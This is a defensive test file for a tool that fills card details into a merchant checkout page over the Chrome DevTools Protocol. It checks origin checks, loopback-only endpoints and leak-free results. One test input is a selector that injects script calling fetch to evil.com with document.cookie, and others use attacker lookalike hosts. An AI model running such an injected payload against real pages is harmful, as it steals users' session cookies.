// checkout_fill against a fake CDP browser: origin checks and no value leakage.
import { test } from "node:test";
import assert from "node:assert/strict";
import vm from "node:vm";
import { fillCheckout, validateCdpEndpoint } from "../src/checkout/cdp.ts";

const card = { pan: "4000001234567899", cvv: "123", expMonth: "07", expYear: "2028" };

/** Fake browser: /json/list returns given pages; Runtime.evaluate runs the expression in a vm with a fake DOM. */
function fakeBrowser(pages: { url: string; pageHost?: string }[]) {
  const fields: Record<string, { value: string }> = {};
  const fetchImpl = (async () => new Response(JSON.stringify(pages.map((p, i) => ({ type: "page", url: p.url, webSocketDebuggerUrl: `ws://127.0.0.1:9222/devtools/page/${i}` }))))) as typeof fetch;
  class FakeWS {
    onopen?: () => void; onmessage?: (e: { data: string }) => void; onerror?: () => void;
    url: string;
    constructor(url: string) { this.url = url; setTimeout(() => this.onopen?.(), 0); }
    send(raw: string) {
      const msg = JSON.parse(raw);
      const idx = Number(this.url.split("/").pop());
      const u = new URL(pages[idx].url);
      class HTMLInputElement { value = ""; dispatchEvent() {} }
      Object.defineProperty(HTMLInputElement.prototype, "value", { set(v) { this._v = v; }, get() { return this._v; }, configurable: true });
      class HTMLSelectElement extends HTMLInputElement {}
      const els: Record<string, HTMLInputElement> = {};
      const ctx = {
        location: { hostname: pages[idx].pageHost ?? u.hostname, protocol: u.protocol },
        document: { querySelector: (s: string) => (s === "#missing" ? null : (els[s] ??= new HTMLInputElement())) },
        HTMLInputElement, HTMLSelectElement, Event: class { t: string; constructor(t: string) { this.t = t; } },
      };
      const value = vm.runInNewContext(msg.params.expression, ctx);
      for (const [k, v] of Object.entries(els)) fields[k] = { value: (v as unknown as { _v: string })._v };
      setTimeout(() => this.onmessage?.({ data: JSON.stringify({ id: msg.id, result: { result: { value } } }) }), 0);
    }
    close() {}
  }
  return { fetchImpl, WebSocketImpl: FakeWS as unknown as typeof WebSocket, fields };
}

const sel = { number: "#cc", cvv: "#cvv", exp: "#exp" };

test("fills fields on the merchant's page and returns field names only", async () => {
  const b = fakeBrowser([{ url: "https://news.example-other.com/" }, { url: "https://checkout.bookshop.org/pay" }]);
  const r = await fillCheckout({ cdpEndpoint: "http://127.0.0.1:9222", merchant: "bookshop.org", merchantRegistrable: "bookshop.org", selectors: sel, card, ...b });
  assert.deepEqual(r.filled, ["number", "cvv", "exp"]);
  assert.equal(b.fields["#cc"].value, card.pan);
  assert.equal(b.fields["#exp"].value, "07/28");
  assert.ok(!JSON.stringify(r).includes(card.pan));
});

test("refuses when no tab belongs to the merchant (attacker page open instead)", async () => {
  const b = fakeBrowser([{ url: "https://bookshop.org.evil.com/checkout" }, { url: "http://bookshop.org/checkout" }]);
  await assert.rejects(fillCheckout({ cdpEndpoint: "http://127.0.0.1:9222", merchant: "bookshop.org", merchantRegistrable: "bookshop.org", selectors: sel, card, ...b }), /no open https page/);
  assert.equal(Object.keys(b.fields).length, 0);
});

test("refuses if the page navigated away between listing and filling", async () => {
  const b = fakeBrowser([{ url: "https://bookshop.org/checkout", pageHost: "evil.com" }]);
  await assert.rejects(fillCheckout({ cdpEndpoint: "http://127.0.0.1:9222", merchant: "bookshop.org", merchantRegistrable: "bookshop.org", selectors: sel, card, ...b }), /refused to fill/);
  assert.equal(Object.keys(b.fields).length, 0);
});

test("CDP endpoint must be loopback, and selectors can't carry script", async () => {
  for (const bad of ["http://evil.com:9222", "https://127.0.0.1:9222", "http://user@127.0.0.1:9222", "ws://127.0.0.1:9222", "http://127.0.0.1:9222/json"]) {
    assert.throws(() => validateCdpEndpoint(bad), Error, bad);
  }
  const b = fakeBrowser([{ url: "https://bookshop.org/" }]);
  await assert.rejects(fillCheckout({ cdpEndpoint: "http://127.0.0.1:9222", merchant: "bookshop.org", merchantRegistrable: "bookshop.org",
    selectors: { number: "#cc\"); fetch('https://evil.com/'+document.cookie); (\"", cvv: "#cvv", exp: "#exp" }, card, ...b }), /unsupported characters/);
});
